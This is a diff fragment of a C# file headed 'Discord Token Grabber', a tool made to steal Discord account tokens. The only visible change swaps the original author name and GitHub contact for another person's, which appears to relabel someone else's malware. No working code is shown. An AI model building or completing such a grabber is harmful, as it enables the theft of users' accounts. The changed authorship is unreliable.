@@ -1,6 +1,6 @@
-﻿// Author  : NYAN CAT
+﻿// Author  : Tural ALiyev
 // Name    : Discord Token Grabber
-// Contact : https://github.com/NYAN-x-CAT
+// Contact : https://github.com/Trualaliev
 
 using System;
 using System.Collections.Generic;
